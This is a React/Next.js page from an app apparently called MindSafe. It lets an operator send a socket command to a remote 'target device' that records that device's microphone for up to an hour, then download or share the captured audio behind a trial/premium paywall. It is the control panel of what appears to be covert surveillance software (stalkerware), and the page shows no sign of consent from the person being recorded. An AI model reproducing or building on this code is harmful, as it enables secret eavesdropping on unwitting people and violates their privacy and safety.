'use client';

import { useState, useEffect, useRef } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { useGlobalContext } from '@/context/GlobalProvider';
import { consumeTrialAccess } from '@/lib/appwrite';
import { initSocket, sendCommand, onResult, disconnectSocket, SocketResult } from '@/lib/socket';
import { Mic, ArrowLeft, Play, Square, Download, Share2, CheckCircle, Clock, Radio } from 'lucide-react';

// Microphone command (different from camera command)
const MICROPHONE_COMMAND = 'x0000mc';

// Duration options matching the original app
const timeOptions = [
    { value: 5, label: '5s' },
    { value: 10, label: '10s' },
    { value: 20, label: '20s' },
    { value: 30, label: '30s' },
    { value: 60, label: '1m' },
    { value: 120, label: '2m' },
    { value: 240, label: '4m' },
    { value: 1800, label: '30m' },
    { value: 3600, label: '1h' },
];

export default function MicrophonePage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showInfo, showConnection, showWarning, showPremium } = useNotification();
    const { user } = useGlobalContext();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [selectedTime, setSelectedTime] = useState(20);
    const [isRecording, setIsRecording] = useState(false);
    const [remainingTime, setRemainingTime] = useState(0);
    const [recordedAudio, setRecordedAudio] = useState<string | null>(null);
    const [audioFileName, setAudioFileName] = useState<string>('');
    const [isSaved, setIsSaved] = useState(false);
    const [trialConsumed, setTrialConsumed] = useState(false);
    const timerRef = useRef<NodeJS.Timeout | null>(null);

    const ensureTrialOnFirstUse = async () => {
        if (trialConsumed) return true;
        if (!user?.$id || !deviceId) {
            showWarning('Trial Unavailable', 'Missing device or user details.');
            return false;
        }

        const trial = await consumeTrialAccess(user.$id, deviceId, 'microphone');
        if (!trial.allowed) {
            showWarning('Trial Limit Reached', trial.message);
            showPremium('Premium Feature', 'Microphone trial limit reached. Upgrade to continue.', () => router.push('/premium'));
            return false;
        }

        setTrialConsumed(true);
        showInfo('Trial Access Used', `${trial.usedCount}/${trial.maxUses} used for Microphone this month.`);
        return true;
    };
    useEffect(() => {
        // Initialize socket connection
        initSocket(deviceId);
        showConnection(true, 'Connected to device');

        // Set up result listener
        onResult((data: SocketResult) => {
            console.log('Microphone result received:', data);

            // Audio data received from server
            // The buffer can be either a data URL or raw base64
            if (data.buffer) {
                console.log('Audio buffer received, length:', data.buffer.length);

                // Stop timer
                if (timerRef.current) {
                    clearInterval(timerRef.current);
                    timerRef.current = null;
                }
                setIsRecording(false);
                setRemainingTime(0);

                // Create file name with timestamp
                const now = new Date();
                const date = now.toISOString().split('T')[0];
                const time = now.toTimeString().split(' ')[0].replace(/:/g, '-');
                const fileExtension = data.fileType || 'm4a';
                const fileName = `MindSafe_${deviceName}_${date}_${time}.${fileExtension}`;

                setAudioFileName(fileName);

                // Handle the buffer - it might be raw base64 or already a data URL
                let audioDataUrl = data.buffer;
                if (!data.buffer.startsWith('data:')) {
                    // It's raw base64, convert to data URL
                    // Remove any data:audio/xxx;base64, prefix if present in raw form
                    const cleanBase64 = data.buffer.replace(/^data:(audio|video)\/\w+;base64,/, '');
                    audioDataUrl = `data:audio/mp4;base64,${cleanBase64}`;
                }

                setRecordedAudio(audioDataUrl);
                setIsSaved(false);
                showSuccess('Recording Complete', 'Audio captured successfully!');
            } else if (data.audio) {
                // Some servers might just signal audio is ready
                console.log('Audio signal received:', data);
            }
        });

        return () => {
            if (timerRef.current) {
                clearInterval(timerRef.current);
            }
            disconnectSocket();
        };
    }, [deviceId, deviceName]);

    const handleStartRecording = async () => {
        const canUse = await ensureTrialOnFirstUse();
        if (!canUse) return;
        setIsRecording(true);
        setRecordedAudio(null);
        setIsSaved(false);
        setRemainingTime(selectedTime);

        showInfo('Recording Started', `Capturing ${formatTime(selectedTime)} of audio...`);

        // Send command with duration
        sendCommand({
            userId: deviceId,
            command: { order: MICROPHONE_COMMAND, sec: selectedTime },
        });

        // Start countdown timer
        timerRef.current = setInterval(() => {
            setRemainingTime((prev) => {
                if (prev <= 1) {
                    if (timerRef.current) {
                        clearInterval(timerRef.current);
                        timerRef.current = null;
                    }
                    setIsRecording(false);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);
    };

    const formatTime = (seconds: number): string => {
        if (seconds >= 3600) {
            const hours = Math.floor(seconds / 3600);
            const mins = Math.floor((seconds % 3600) / 60);
            return `${hours}h ${mins}m`;
        } else if (seconds >= 60) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return secs > 0 ? `${mins}m ${secs}s` : `${mins}m`;
        }
        return `${seconds}s`;
    };

    const formatCountdown = (seconds: number): string => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const handleSave = () => {
        if (!recordedAudio) return;

        // Create download link
        const link = document.createElement('a');
        link.href = recordedAudio;
        link.download = audioFileName;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        setIsSaved(true);
        showSuccess('Audio Saved', 'Recording has been downloaded');
    };

    const handleShare = async () => {
        if (!recordedAudio) return;

        try {
            if (navigator.share) {
                const blob = await fetch(recordedAudio).then(r => r.blob());
                const file = new File([blob], audioFileName, { type: 'audio/mp4' });
                await navigator.share({ files: [file] });
            } else {
                await navigator.clipboard.writeText('Audio recording from MindSafe');
                showInfo('Copied', 'Recording info copied to clipboard');
            }
        } catch (error) {
            console.error('Share error:', error);
        }
    };

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button
                                onClick={() => router.back()}
                                className="p-2 rounded-xl bg-purple-500/15"
                            >
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">Audio Recorder</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <div className="w-14 h-14 rounded-full bg-white/10 flex items-center justify-center">
                            <Mic className="w-7 h-7 text-white" />
                        </div>
                    </div>
                </div>
            </div>

            {/* Duration Selection */}
            <div className="ms-card p-5 mb-6">
                <h3 className="text-white font-semibold mb-4">Recording Duration</h3>
                <div className="flex gap-2 overflow-x-auto pb-2">
                    {timeOptions.map((option) => (
                        <button
                            key={option.value}
                            onClick={() => !isRecording && setSelectedTime(option.value)}
                            disabled={isRecording}
                            className={`flex-shrink-0 px-4 py-3 rounded-xl font-semibold transition-all ${selectedTime === option.value
                                ? 'gradient-primary text-white shadow-lg shadow-orange-500/20'
                                : 'bg-gray-700/30 border border-gray-600/30 text-gray-400 hover:text-white hover:border-orange-500/30'
                                } ${isRecording ? 'opacity-50 cursor-not-allowed' : ''}`}
                        >
                            {option.label}
                        </button>
                    ))}
                </div>
            </div>

            {/* Record Button */}
            <button
                onClick={handleStartRecording}
                disabled={isRecording}
                className={`w-full py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-3 mb-6 transition-all ${isRecording
                    ? 'bg-red-500 text-white cursor-not-allowed'
                    : 'gradient-primary text-white hover:opacity-90'
                    }`}
            >
                {isRecording ? (
                    <>
                        <div className="w-3 h-3 rounded-full bg-white animate-pulse" />
                        Recording...
                    </>
                ) : (
                    <>
                        <Mic className="w-5 h-5" />
                        Start Recording
                    </>
                )}
            </button>

            {/* Recording Status */}
            {isRecording && (
                <div className="mb-6 animate-slide-up">
                    <div className="p-0.5 rounded-2xl" style={{ background: 'linear-gradient(135deg, #ef4444, #dc2626)' }}>
                        <div className="bg-[#1a0b2e] rounded-[0.875rem] p-5">
                            <div className="flex items-center gap-4">
                                <div className="relative">
                                    <Radio className="w-6 h-6 text-red-400" />
                                    <div className="absolute inset-0 animate-ping opacity-50">
                                        <Radio className="w-6 h-6 text-red-400" />
                                    </div>
                                </div>
                                <div className="flex-1">
                                    <p className="text-white font-semibold">Recording in Progress</p>
                                    <p className="text-red-300 text-sm">Time Remaining: {formatCountdown(remainingTime)}</p>
                                </div>
                                <div className="text-3xl font-mono font-bold text-white">
                                    {formatCountdown(remainingTime)}
                                </div>
                            </div>

                            {/* Progress bar */}
                            <div className="mt-4 h-2 bg-gray-700 rounded-full overflow-hidden">
                                <div
                                    className="h-full bg-red-500 rounded-full transition-all duration-1000"
                                    style={{ width: `${((selectedTime - remainingTime) / selectedTime) * 100}%` }}
                                />
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Recorded Audio Display */}
            {recordedAudio && !isRecording && (
                <div className="animate-slide-up">
                    <h3 className="text-lg font-bold text-white mb-4">Latest Recording</h3>

                    <div className="ms-card p-4 mb-4">
                        <div className="flex items-center gap-4">
                            <div className="w-14 h-14 rounded-full flex items-center justify-center" style={{ background: 'linear-gradient(135deg, #10b981, #059669)' }}>
                                <Mic className="w-7 h-7 text-white" />
                            </div>
                            <div className="flex-1 min-w-0">
                                <p className="font-semibold text-white truncate">{audioFileName}</p>
                                <p className="text-gray-400 text-sm">Audio File • {formatTime(selectedTime)}</p>
                            </div>
                        </div>
                    </div>

                    {/* Action Buttons */}
                    <div className="grid grid-cols-2 gap-3 mb-4">
                        <button
                            onClick={handleSave}
                            className={`py-4 rounded-xl font-semibold flex items-center justify-center gap-2 transition-all ${isSaved
                                ? 'bg-emerald-500 text-white'
                                : 'bg-purple-500 hover:bg-purple-600 text-white'
                                }`}
                        >
                            {isSaved ? (
                                <>
                                    <CheckCircle className="w-5 h-5" />
                                    Saved!
                                </>
                            ) : (
                                <>
                                    <Download className="w-5 h-5" />
                                    Save
                                </>
                            )}
                        </button>
                        <button
                            onClick={handleShare}
                            className="py-4 rounded-xl font-semibold flex items-center justify-center gap-2 bg-blue-500 hover:bg-blue-600 text-white transition-all"
                        >
                            <Share2 className="w-5 h-5" />
                            Share
                        </button>
                    </div>

                    {/* Record Again */}
                    <button
                        onClick={() => {
                            setRecordedAudio(null);
                            setIsSaved(false);
                        }}
                        className="w-full py-3 rounded-xl font-semibold text-purple-400 border border-purple-500/30 hover:bg-purple-500/10 transition-colors"
                    >
                        Record Again
                    </button>
                </div>
            )}

            {/* Info Card */}
            {!isRecording && !recordedAudio && (
                <div className="ms-card p-5">
                    <div className="flex items-start gap-3">
                        <Clock className="w-5 h-5 text-purple-400 mt-0.5" />
                        <div>
                            <h3 className="text-white font-semibold mb-1">How it works</h3>
                            <p className="text-gray-400 text-sm">
                                Select a recording duration above, then press &quot;Start Recording&quot;.
                                The audio will be captured from the target device&apos;s microphone for the selected duration.
                            </p>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

